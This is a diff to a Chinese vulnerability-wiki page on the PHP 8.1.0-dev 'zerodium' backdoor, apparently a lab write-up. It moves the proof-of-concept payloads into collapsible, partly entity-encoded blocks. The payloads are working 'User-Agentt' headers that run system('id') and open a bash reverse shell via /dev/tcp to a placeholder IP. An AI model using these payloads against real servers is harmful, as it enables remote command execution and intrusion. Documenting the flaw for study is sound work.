@@ -50,23 +50,29 @@ docker compose up -d
 
 ```
 User-Agentt: zerodiumvar_dump(233*233);
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/language/images/PHP%208.1.0-dev%20%E5%BC%80%E5%8F%91%E7%89%88%E6%9C%AC%20zerodium%20%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/image-20240529084958596.png)
 
 执行命令：
 
 ```plain
-User-Agentt: zerodiumsystem("id");
-```
+User-Agentt: zerodium&#115;ystem("id");</code></pre>
+
+</details>
 
 ![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/language/images/PHP%208.1.0-dev%20%E5%BC%80%E5%8F%91%E7%89%88%E6%9C%AC%20zerodium%20%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/image-20240529085013250.png)
 
 反弹 shell：
 
-```
-User-Agentt: zerodiumsystem("bash -c 'exec bash -i &> /dev/tcp/<your-ip>/<port> <& 1'");
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">User-Agentt: zerodium&#115;ystem("bash -c 'exec &#98;ash -i &amp;&gt; &#47;dev/tcp/&lt;your-ip&gt;/&lt;port&gt; &lt;&amp; 1'");</code></pre>
+
+</details>
 
 ![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/language/images/PHP%208.1.0-dev%20%E5%BC%80%E5%8F%91%E7%89%88%E6%9C%AC%20zerodium%20%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/image-20240529085117047.png)
 
